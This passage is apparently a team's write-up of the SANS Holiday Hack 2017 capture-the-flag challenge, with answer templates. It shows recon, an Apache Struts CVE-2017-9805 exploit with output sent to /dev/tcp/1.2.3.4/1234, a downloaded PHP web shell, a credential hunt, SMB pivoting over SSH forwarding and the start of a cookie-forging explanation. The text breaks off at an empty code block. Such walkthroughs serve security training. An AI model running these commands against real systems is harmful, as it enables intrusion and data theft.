&lt;<span style="font-weight: bold;">a</span> <span style="font-weight: bold; font-style: italic;">href</span>=<span style="font-style: italic;">"http://dev.northpolechristmastown.com"</span> <span style="font-weight: bold; font-style: italic;">style</span>=<span style="font-style: italic;">"display: none;"</span>&gt;Access Development Version&lt;/<span style="font-weight: bold;">a</span>&gt;
</pre>
</div>

<p>
Let's do some recon on the hosts:
</p>

<div class="org-src-container">

<pre class="src src-sh">nmap -sC l2s.northpolechristmastown.com

Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-03 15:36 CST
Nmap scan report for l2s.northpolechristmastown.com (35.185.84.51)
Host is up (0.027s latency)<span style="font-weight: bold;">.</span>
rDNS record for 35.185.84.51: 51.84.185.35.bc.googleusercontent.com
Not shown: 996 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
| ssh-hostkey:
|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
80/tcp   open   http
|_http-title: Did not follow redirect to https://l2s.northpolechristmastown.com/
443/tcp  open   https
|_http-title: Toys List
| ssl-cert: Subject: <span style="font-weight: bold; font-style: italic;">commonName</span>=dev.northpolechristmastown.com
| Subject Alternative Name: DNS:dev.northpolechristmastown.com, DNS:l2s.northpolechristmastown.com
| Not valid before: 2017-11-29T12:54:54
|_Not valid after:  2018-02-27T12:54:54
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg:
|_  http/1.1
3389/tcp closed ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned<span style="font-weight: bold;"> in</span> 7.04 seconds
</pre>
</div>

<p>
There appears to be another name on the certificate of the host. Let's let nmap's scripts scan that as well.
</p>

<div class="org-src-container">

<pre class="src src-sh">nmap -sC dev.northpolechristmastown.com

Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-03 15:36 CST
Nmap scan report for dev.northpolechristmastown.com (35.185.84.51)
Host is up (0.028s latency)<span style="font-weight: bold;">.</span>
rDNS record for 35.185.84.51: 51.84.185.35.bc.googleusercontent.com
Not shown: 996 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
| ssh-hostkey:
|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
80/tcp   open   http
|_http-title: Did not follow redirect to https://dev.northpolechristmastown.com/
443/tcp  open   https
| http-title: Toys List
|_Requested resource was /orders.xhtml
| ssl-cert: Subject: <span style="font-weight: bold; font-style: italic;">commonName</span>=dev.northpolechristmastown.com
| Subject Alternative Name: DNS:dev.northpolechristmastown.com, DNS:l2s.northpolechristmastown.com
| Not valid before: 2017-11-29T12:54:54
|_Not valid after:  2018-02-27T12:54:54
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg:
|_  http/1.1
3389/tcp closed ms-wbt-server
</pre>
</div>

<p>
We can see that dev and l2s are one in the same. Visiting the dev page has a footer
that simply states <code>Powered By: Apache Struts</code>. Let's use this to our advantage.
Let's use the tool provided through the SANS Pentest blog,
<a href="https://github.com/chrisjd20/cve-2017-9805.py">cve-2017-9805.py</a>. The dev page
we land on is <a href="https://dev.northpolechristmastown.com/orders.xhtml">https://dev.northpolechristmastown.com/orders.xhtml</a> so we'll use
that to start from.
</p>

<div class="org-src-container">

<pre class="src src-sh">python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c <span style="font-style: italic;">'ls'</span>
[+] Encoding Command
[+] Building XML object
[+] Placing command<span style="font-weight: bold;"> in</span> XML object
[+] Converting Back to String
[+] Making Post Request with our payload
[+] Payload executed
</pre>
</div>

<p>
Looks like we need to modify the program to let us see what it's
doing by uncommenting the following line:
</p>

<div class="org-src-container">

<pre class="src src-sh">print request.text
</pre>
</div>

<p>
Performing the same simple command above results in a lengthy Apache Tomcat
error with no apparent output from our <code>ls</code> command. We're dealing with a
blind injection so we'll need to figure out a different way to get the output
of the command. One trick we can pull is redirecting output to a special
pseudo device, <code>/dev/tcp/$host/$port</code>. First we'll need to set up a listener
on our end first.
</p>

<div class="org-src-container">

<pre class="src src-sh">holiday@hack:~$ nc -l -p 8888
</pre>
</div>

<p>
Now we run the exploit again:
</p>

<div class="org-src-container">

<pre class="src src-sh">./cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c <span style="font-style: italic;">"ls &gt; /dev/tcp/1.2.3.4/1234"</span>
</pre>
</div>

<p>
The result on our end is:
</p>
<div class="org-src-container">

<pre class="src src-sh">holiday@hack:~$ nc -l -p 8888
bin
boot
dev
etc
home
...
vmlinuz
vmlinuz.old
</pre>
</div>

<p>
It looks like we've been dropped into the root directory. Let's look for
where the web root is. Normally, the default is /var/www/html on most
linux+apache based hosts. We'll try again with the command <code>ls -al /var/ww/html</code>.
</p>

<div class="org-src-container">

<pre class="src src-sh">total 1772
drwxrwxrwt 6 www-data           www-data              4096 Jan  6 03:00 .
drwxr-xr-x 3 root               root                  4096 Oct 12 14:35 ..
drwxr-xr-x 2 root               www-data              4096 Oct 12 19:03 css
drwxr-xr-x 3 root               www-data              4096 Oct 12 19:40 fonts
-r--r--r-- 1 root               www-data           1764298 Dec  4 20:25 GreatBookPage2.pdf
drwxr-xr-x 2 root               www-data              4096 Oct 12 19:14 imgs
-rw-r--r-- 1 root               www-data             14501 Nov 24 20:53 index.html
drwxr-xr-x 2 root               www-data              4096 Oct 12 19:11 js
-rwx------ 1 www-data           www-data               231 Oct 12 21:25 process.php
</pre>
</div>

<p>
Oh look. There's <a href="https://l2s.northpolechristmastown.com/GreatBookPage2.pdf">GreatBookPage2.pdf</a>. We can download it and find the answer to the first question. Now on to the second.
</p>

<p>
It looks like we found our web root. Let's try out the
web shell they suggest in the hints from Josh Wright
<a href="https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/be4b2c021b284f21418f55b9d4496cdd3b3c86d8/easy-simple-php-webshell.php">easy-simple-php-webshell.php</a>.
We'll output it to a random file in the web root then
we can try to use it to execute commands using a browser.
</p>

<div class="org-src-container">

<pre class="src src-sh">./cve-2017-9805.py -c <span style="font-style: italic;">"wget -O /var/www/html/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/be4b2c021b284f21418f55b9d4496cdd3b3c86d8/easy-simple-php-webshell.php"</span> -u https://dev.northpolechristmastown.com/orders.xhtml
</pre>
</div>

<p>
Now we can access <a href="https://l2s.northpolechristmastown.com/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php">https://l2s.northpolechristmastown.com/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php</a> and look around. If we do an <code>ls</code> in this webshell, it just returns the local directory, <code>/var/www/html</code>. Nothing in here suggests that we have the webroot for the dev server, <a href="https://dev.northpolechristmastown.com">https://dev.northpolechristmastown.com</a>.
</p>

<p>
Let's run <code>find</code> to see if we can find the password in our webshell.
</p>

<div class="org-src-container">

<pre class="src src-sh">find / -xdev -type f -user alabaster_snowball 2&gt;/dev/null |xargs grep password
</pre>
</div>

<p>
Within the page full of results we see this:
</p>

<div class="org-src-container">

<pre class="src src-sh">/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String password = <span style="font-style: italic;">"stream_unhappy_buy_loss"</span>;
</pre>
</div>

<p>
A closer look at <code>OrderMySql.class</code> using <code>cat /opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class</code> we find:
</p>

<div class="org-src-container">

<pre class="src src-sh">final String username = <span style="font-style: italic;">"alabaster_snowball"</span>;
final String password = <span style="font-style: italic;">"stream_unhappy_buy_loss"</span>;
</pre>
</div>
</div>
</li>


<li><a id="solution" name="solution"></a><a id="sec-6-2-1-5" name="sec-6-2-1-5"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
</div>

<ul class="org-ul"><li><a id="sec-6-2-1-5-1" name="sec-6-2-1-5-1"></a>What is the topic of The Great Book page available in the web root of the server?<br  /><div class="outline-text-6" id="text-6-2-1-5-1">
<p>
On the Topic of Flying Animals
</p>
</div>
</li>

<li><a id="sec-6-2-1-5-2" name="sec-6-2-1-5-2"></a>What is Alabaster Snowballs password?<br  /><div class="outline-text-6" id="text-6-2-1-5-2">
<p>
<code>stream_unhappy_buy_loss</code>
</p>
</div>
</li></ul>
</li>

<li><a id="alternatives" name="alternatives"></a><a id="sec-6-2-1-6" name="sec-6-2-1-6"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
</div>
</li></ul>
</div>

<div id="outline-container-sec-6-2-2" class="outline-4">
<h4 id="sec-6-2-2"><span class="todo TODO">TODO</span> ripgrep</h4>
</div>
<div id="outline-container-sec-6-2-3" class="outline-4">
<h4 id="sec-6-2-3"><span class="todo TODO">TODO</span> SSH key method</h4>
<div class="outline-text-4" id="text-6-2-3">
</div><ul class="org-ul"><li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-6-2-3-1" name="sec-6-2-3-1"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">

<p>
Do we know what issue(s) people were running into?
</p>
</div>
</li>

<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-6-2-3-2" name="sec-6-2-3-2"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">

<p>
How was the challenge setup? Was there a better way to secure this
system?
</p>
</div>
</li></ul>
</div>
</div>
<div id="outline-container-sec-6-3" class="outline-3">
<h3 id="sec-6-3"><span class="todo TODO">TODO</span> Question 3</h3>
<div class="outline-text-3" id="text-6-3">
</div><div id="outline-container-answer-template" class="outline-4">
<h4 id="answer-template"><a id="sec-6-3-1" name="sec-6-3-1"></a>Answer Template</h4>
<div class="outline-text-4" id="text-answer-template">
</div>

<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-6-3-1-1" name="sec-6-3-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">

<ol class="org-ol">
<li>The North Pole engineering team uses a Windows SMB server for sharing
documentation and correspondence. Using your access to the Letters to
Santa server, identify and enumerate the SMB file-sharing server.
What is the file server share name?
</li>
</ol>
</div>
</li>

<li><a id="background-information" name="background-information"></a><a id="sec-6-3-1-2" name="sec-6-3-1-2"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">

<p>
The scope statement calls out systems on 10.142.0.0/24 as being in scope:
</p>

<blockquote>
<p>
SCOPE: For this entire challenge, you are authorized to attack ONLY
the Letters to Santa system at l2s.northpolechristmastown.com AND
other systems on the internal 10.142.0.0/24 network that you access
through the Letters to Santa system.
</p>
</blockquote>

<p>
The question mentions pivoting through the Letters to Santa server (<code>l2s</code>). A commonly used tool for network discovery is <code>nmap</code>, and we can check that it's available on <code>l2s</code>:
</p>

<div class="org-src-container">

<pre class="src src-sh">alabaster_snowball@hhc17-apache-struts1:/tmp/asnow.VmaV55tqZi5rteO9fXHB3kjM$ nmap -V

Nmap version 7.40 ( https://nmap.org )
Platform: x86_64-pc-linux-gnu
Compiled with: liblua-5.3.3 openssl-1.1.0c libpcre-8.39 libpcap-1.8.1 nmap-libdnet-1.12 ipv6
Compiled without:
Available nsock engines: epoll poll select
</pre>
</div>

<p>
There's a great <code>nmap</code> overview available here: <a href="https://nmap.org/book/nmap-overview-and-demos.html">https://nmap.org/book/nmap-overview-and-demos.html</a>
</p>

<p>
We also know that the SMB suite of protocols uses a lot of ports, but 445 is one of the main ones.
</p>

<p>
Blog Posts:
</p>

<p>
This post on the SANS Pen Testing Blog seems relevant, but masscan isn't installed on <code>l2s</code>:
</p>

<ul class="org-ul">
<li>Massively Scaling your Scanning
<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
</li>
</ul>
</div>
</li>

<li><a id="goal" name="goal"></a><a id="sec-6-3-1-3" name="sec-6-3-1-3"></a>Goal<br  /><div class="outline-text-5" id="text-goal">

<p>
Three separate things:
</p>

<ol class="org-ol">
<li>Identify the SMB server,
</li>
<li>Enumerate the shares on it,
</li>
<li>Name the file server share.
</li>
</ol>
</div>
</li>

<li><a id="approach" name="approach"></a><a id="sec-6-3-1-4" name="sec-6-3-1-4"></a>Approach<br  /><div class="outline-text-5" id="text-approach">

<p>
Let's follow the <code>nmap</code> overview.
</p>

<blockquote>
<p>
Being the careful type, Felix first starts out with what is known as
an Nmap list scan (-sL option). This feature simply enumerates every
IP address in the given target netblock(s) and does a reverse-DNS
lookup (unless -n was specified) on each. One reason to do this first
is stealth. The names of the hosts can hint at potential
vulnerabilities and allow for a better understanding of the target
network, all without raising alarm bells.
</p>
</blockquote>

<div class="org-src-container">

<pre class="src src-sh">alabaster_snowball@hhc17-apache-struts1:/tmp/asnow.sjKK74OSjKfIxlr5otQil8yd$ nmap -sL 10.142.0.0/24

Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-08 02:40 UTC
Nmap scan report for 10.142.0.0
Nmap scan report for 10.142.0.1
Nmap scan report for hhc17-l2s-proxy.c.holidayhack2017.internal (10.142.0.2)
Nmap scan report for hhc17-apache-struts1.c.holidayhack2017.internal (10.142.0.3)
Nmap scan report for 10.142.0.4
Nmap scan report for mail.northpolechristmastown.com (10.142.0.5)
Nmap scan report for edb.northpolechristmastown.com (10.142.0.6)
Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
Nmap scan report for 10.142.0.9
Nmap scan report for 10.142.0.10
Nmap scan report for hhc17-apache-struts2.c.holidayhack2017.internal (10.142.0.11)
Nmap scan report for 10.142.0.12
Nmap scan report for eaas.northpolechristmastown.com (10.142.0.13)
Nmap scan report for 10.142.0.14
Nmap scan report for 10.142.0.15
...
</pre>
</div>

<p>
Parsing the results a bit:
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="left" />

<col  class="right" />
</colgroup>
<thead>
<tr>
<th scope="col" class="left">Hostname</th>
<th scope="col" class="right">IP</th>
</tr>
</thead>
<tbody>
<tr>
<td class="left">hhc17-l2s-proxy</td>
<td class="right">10.142.0.2</td>
</tr>

<tr>
<td class="left">hhc17-apache-struts1</td>
<td class="right">10.142.0.3</td>
</tr>

<tr>
<td class="left">mail</td>
<td class="right">10.142.0.5</td>
</tr>

<tr>
<td class="left">edb</td>
<td class="right">10.142.0.6</td>
</tr>

<tr>
<td class="left">hhc17-smb-server</td>
<td class="right">10.142.0.7</td>
</tr>

<tr>
<td class="left">hhc17-emi</td>
<td class="right">10.142.0.8</td>
</tr>

<tr>
<td class="left">hhc17-apache-struts2</td>
<td class="right">10.142.0.11</td>
</tr>

<tr>
<td class="left">eaas</td>
<td class="right">10.142.0.13</td>
</tr>
</tbody>
</table>

<p>
One of the systems is named <code>hhc17-smb-server</code>. 
</p>

<p>
Continuing with the overview, we can now narrow in on a single IP:
</p>

<div class="org-src-container">

<pre class="src src-sh">alabaster_snowball@hhc17-apache-struts1:/tmp/asnow.sjKK74OSjKfIxlr5otQil8yd$ nmap -p- -PS445 -A -T4 -oA avatartcpscan-%D 10.142.0.7

Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-08 02:51 UTC
Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
Host is up (0.00040s latency)<span style="font-weight: bold;">.</span>
Not shown: 65527 filtered ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: <span style="font-weight: bold; font-style: italic;">commonName</span>=hhc17-emi
| Not valid before: 2017-11-06T13:51:23
|_Not valid after:  2018-05-08T13:51:23
|_ssl-date: 2018-01-08T02:54:30+00:00; 0s from scanner time.
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: <span style="font-weight: bold; font-style: italic;">commonName</span>=hhc17-emi
| Subject Alternative Name: DNS:hhc17-emi
| Not valid before: 2017-11-07T13:52:11
|_Not valid after:  2018-11-07T13:52:11
|_ssl-date: 2018-01-08T02:54:30+00:00; 0s from scanner time.
49666/tcp open  msrpc              Microsoft Windows RPC
49668/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: HHC17-EMI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 42:01:0a:8e:00:07 (unknown)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned<span style="font-weight: bold;"> in</span> 205.99 seconds
</pre>
</div>

<p>
So it does indeed seem to be an SMB server. A command-line tool to access it is <code>smbclient</code>:
</p>

<div class="org-src-container">

<pre class="src src-sh">alabaster_snowball@hhc17-apache-struts1:/tmp/asnow.sjKK74OSjKfIxlr5otQil8yd$ smbclient -L 10.142.0.7 -U alabaster_snowball
rbash: smbclient: command not found
</pre>
</div>

<p>
It's not available on <code>l2s</code>. Another option is forwarding a port through SSH:
</p>

<div class="org-src-container">

<pre class="src src-sh">user@vps $ ssh alabaster_snowball@l2s.northpolechristmastown.com -O forward -L 4445:10.142.0.7:445
</pre>
</div>

<p>
Now we can access port 445 on <code>hhc17-smb-server</code> via port 4445 on <code>localhost</code>:
</p>

<div class="org-src-container">

<pre class="src src-sh">user@vps $ smbclient -L localhost -p 4445 -U alabaster_snowball
WARNING: The <span style="font-style: italic;">"syslog"</span> option is deprecated
Enter alabaster_snowball<span style="font-style: italic;">'s password:</span>
<span style="font-style: italic;">Domain=[HHC17-EMI] OS=[Windows Server 2016 Datacenter 14393] Server=[Windows Server 2016 Datacenter 6.3]</span>

<span style="font-style: italic;">        Sharename       Type      Comment</span>
<span style="font-style: italic;">        ---------       ----      -------</span>
<span style="font-style: italic;">        ADMIN$          Disk      Remote Admin</span>
<span style="font-style: italic;">        C$              Disk      Default share</span>
<span style="font-style: italic;">        FileStor        Disk</span>
<span style="font-style: italic;">        IPC$            IPC       Remote IPC</span>
<span style="font-style: italic;">Connection to localhost failed (Error NT_STATUS_CONNECTION_REFUSED)</span>
<span style="font-style: italic;">NetBIOS over TCP disabled -- no workgroup available</span>
</pre>
</div>

<p>
<code>FileStor</code> looks interesting. Let's see what's on it:
</p>

<div class="org-src-container">

<pre class="src src-sh">user@vps $ smbclient //localhost/FileStor -p 4445 -U alabaster_snowball
WARNING: The <span style="font-style: italic;">"syslog"</span> option is deprecated
Enter alabaster_snowball<span style="font-style: italic;">'s password:</span>
<span style="font-style: italic;">Domain=[HHC17-EMI] OS=[Windows Server 2016 Datacenter 14393] Server=[Windows Server 2016 Datacenter 6.3]</span>
<span style="font-style: italic;">smb: \&gt; ls</span>
<span style="font-style: italic;">  .                                   D        0  Wed Dec  6 16:51:46 2017</span>
<span style="font-style: italic;">  ..                                  D        0  Wed Dec  6 16:51:46 2017</span>
<span style="font-style: italic;">  BOLO - Munchkin Mole Report.docx      A   255520  Wed Dec  6 16:44:17 2017</span>
<span style="font-style: italic;">  GreatBookPage3.pdf                  A  1275756  Mon Dec  4 14:21:44 2017</span>
<span style="font-style: italic;">  MEMO - Calculator Access for Wunorse.docx      A   111852  Mon Nov 27 14:01:36 2017</span>
<span style="font-style: italic;">  MEMO - Password Policy Reminder.docx      A   133295  Wed Dec  6 16:47:28 2017</span>
<span style="font-style: italic;">  Naughty and Nice List.csv           A    10245  Thu Nov 30 14:42:00 2017</span>
<span style="font-style: italic;">  Naughty and Nice List.docx          A    60344  Wed Dec  6 16:51:25 2017</span>

<span style="font-style: italic;">                13106687 blocks of size 4096. 9624115 blocks available</span>
<span style="font-style: italic;">smb: \&gt; mget *</span>
<span style="font-style: italic;">getting file \BOLO - Munchkin Mole Report.docx of size 255520 as BOLO - Munchkin Mole Report.docx (1094.4 KiloBytes/sec) (average 1094.4 KiloBytes/sec)</span>
<span style="font-style: italic;">getting file \GreatBookPage3.pdf of size 1275756 as GreatBookPage3.pdf (2818.7 KiloBytes/sec) (average 2231.9 KiloBytes/sec)</span>
<span style="font-style: italic;">getting file \MEMO - Calculator Access for Wunorse.docx of size 111852 as MEMO - Calculator Access for Wunorse.docx (666.0 KiloBytes/sec) (average 1924.0 KiloBytes/sec)</span>
<span style="font-style: italic;">getting file \MEMO - Password Policy Reminder.docx of size 133295 as MEMO - Password Policy Reminder.docx (834.4 KiloBytes/sec) (average 1752.3 KiloBytes/sec)</span>
<span style="font-style: italic;">getting file \Naughty and Nice List.csv of size 10245 as Naughty and Nice List.csv (99.1 KiloBytes/sec) (average 1599.3 KiloBytes/sec)</span>
<span style="font-style: italic;">getting file \Naughty and Nice List.docx of size 60344 as Naughty and Nice List.docx (390.3 KiloBytes/sec) (average 1452.3 KiloBytes/sec)</span>
</pre>
</div>
</div>
</li>

<li><a id="solution" name="solution"></a><a id="sec-6-3-1-5" name="sec-6-3-1-5"></a>Solution<br  /><div class="outline-text-5" id="text-solution">

<p>
We used <code>nmap</code> to list our targets, and found <code>hhc17-smb-server</code>. We
used SSH forwarding to connect to it with <code>smbclient</code>. We used the
credentials we found for question 2 to connect.
</p>
</div>
</li>

<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-6-3-1-6" name="sec-6-3-1-6"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">

<p>
It looks like <code>hhc17-smb-server</code> blocks pings. By default, <code>nmap</code> uses
pings to determine which hosts are up, and which it should scan
further. We used the "list scan," which just did reverse DNS queries,
and were able to identify the system quickly. If, however, someone
just tried to run <code>nmap -p 445 10.142.0.0/24</code>, they wouldn't find the system.
</p>

<p>
It also looked like two systems were mixed up in NetBIOS and RDP SSL cert names:
</p>

<pre class="example">
Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
...
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=hhc17-emi
...
Host script results:
| nbstat: NetBIOS name: HHC17-EMI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 42:01:0a:8e:00:07 (unknown)
...
Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
...
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=hhc17-smb-server
...
Host script results:
| nbstat: NetBIOS name: HHC17-SMB-SERVE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 42:01:0a:8e:00:08 (unknown)
</pre>
</div>
</li></ul>
</div>
</div>
<div id="outline-container-sec-6-4" class="outline-3">
<h3 id="sec-6-4"><span class="todo TODO">TODO</span> Question 4</h3>
<div class="outline-text-3" id="text-6-4">
</div><div id="outline-container-answer-template" class="outline-4">
<h4 id="answer-template"><a id="sec-6-4-1" name="sec-6-4-1"></a>Answer Template</h4>
<div class="outline-text-4" id="text-answer-template">
</div>

<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-6-4-1-1" name="sec-6-4-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">

<ol class="org-ol">
<li>Elf Web Access (EWA) is the preferred mailer for North Pole elves,
available internally at <a href="http://mail.northpolechristmastown.com">http://mail.northpolechristmastown.com</a>. What
can you learn from The Great Book page found in an e-mail on that
server?
</li>
</ol>
</div>
</li>

<li><a id="background-information" name="background-information"></a><a id="sec-6-4-1-2" name="sec-6-4-1-2"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">

<p>
Do we know anything about this system already?
</p>

<p>
Hints:
</p>

<p>
List any useful hints here.
</p>

<p>
Blog Posts:
</p>

<p>
Are any of these useful?
</p>

<ul class="org-ul">
<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
(EC2)
<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
Spinning up an EC2 instance, but also a lot of emphasis on how to use
SSH keys.
</li>
<li>Your Pokemon Guide for Essential SQL Pen Test Commands
<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
</li>
<li>Exploiting XXE Vulnerabilities in IIS/.NET
<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
Including remote content in XML
</li>
<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
</li>
<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a>
</li>
<li>A Spot of Tee
<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
bash shell, and bypassing the I/O restriction with tee
</li>
<li>Understanding and Exploiting Web-based LDAP
<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
LDAP syntax, LDAP injection
</li>
<li>Massively Scaling your Scanning
<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
masscan
</li>
</ul>
</div>
</li>

<li><a id="goal" name="goal"></a><a id="sec-6-4-1-3" name="sec-6-4-1-3"></a>Goal<br  /><div class="outline-text-5" id="text-goal">

<p>
What are we trying to accomplish?
</p>
</div>
</li>

<li><a id="approach" name="approach"></a><a id="sec-6-4-1-4" name="sec-6-4-1-4"></a>Approach<br  /><div class="outline-text-5" id="text-approach">

<p>
Describe the thought process that we tried here. How were we able to use
the hints or the blog posts?
</p>
</div>
</li>

<li><a id="solution" name="solution"></a><a id="sec-6-4-1-5" name="sec-6-4-1-5"></a>Solution<br  /><div class="outline-text-5" id="text-solution">

<p>
Summarize the reference solution that we found
</p>
</div>

<ul class="org-ul"><li><a id="sec-6-4-1-5-1" name="sec-6-4-1-5-1"></a>How to forge a session cookie<br  /><div class="outline-text-6" id="text-6-4-1-5-1">
<blockquote>
<p>
Happy families are all alike; every unhappy family is unhappy in its own way. &#x2013;   Leo Tolstoy
</p>
</blockquote>

<blockquote>
<p>
Empty plaintext encrypted without using HMAC are all alike; Rolling your own crypto makes all cryptographers unhappy. &#x2013; Justin Azoff
</p>
</blockquote>

<p>
The js code they use is a variation of a challenge response algorithm, but it
is flawed in that the client is providing both the challenge and the response.
It is also flawed in that it does not use MAC <a href="https://en.wikipedia.org/wiki/Authenticated_encryption#MAC-then-Encrypt_(MtE)">https://en.wikipedia.org/wiki/Authenticated_encryption#MAC-then-Encrypt_(MtE)</a>
meaning that the encrypted contents themselves are never verified.
</p>

<p>
Since we can control both the ciphertext and the expected plaintext, we can
just set the challenge to the empty string "" and the response then just needs
to be ANY message that decrypts to "".  Since the message is empty, the key is
irrelevant, we just need to work out how to properly generate a ciphertext that
will decrypt to nothing.
</p>

<p>
A completly empty ciphertext throws an error:
</p>

<div class="org-src-container">

<pre class="src src-js">&gt; <span style="font-weight: bold;">var</span> <span style="font-weight: bold; font-style: italic;">aes256</span> = require(<span style="font-style: italic;">'aes256'</span>);
&gt; aes256.decrypt(<span style="font-style: italic;">'key does not matter'</span>, <span style="font-style: italic;">''</span>)
TypeError: Provided <span style="font-style: italic;">"encrypted"</span> must be a non-empty string
    at Object.decrypt (<span style="font-style: italic;">/Users/</span>user/node_modules/aes256/index.js:68:13)
</pre>
</div>

<p>
A larger ciphertext works, but gives us a random string, which is not what we want.. but 
we can see that a fairly long cipher text only gives us a few bytes of plaintext&#x2026;
</p>

<div class="org-src-container">

<pre class="src src-js">&gt; aes256.decrypt(<span style="font-style: italic;">'key does not matter'</span>, <span style="font-style: italic;">'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'</span>)
<span style="font-style: italic;">'F..%=X..'</span>
</pre>
</div>

<p>
The difference in the length of the two strings is 24:
</p>

<div class="org-src-container">

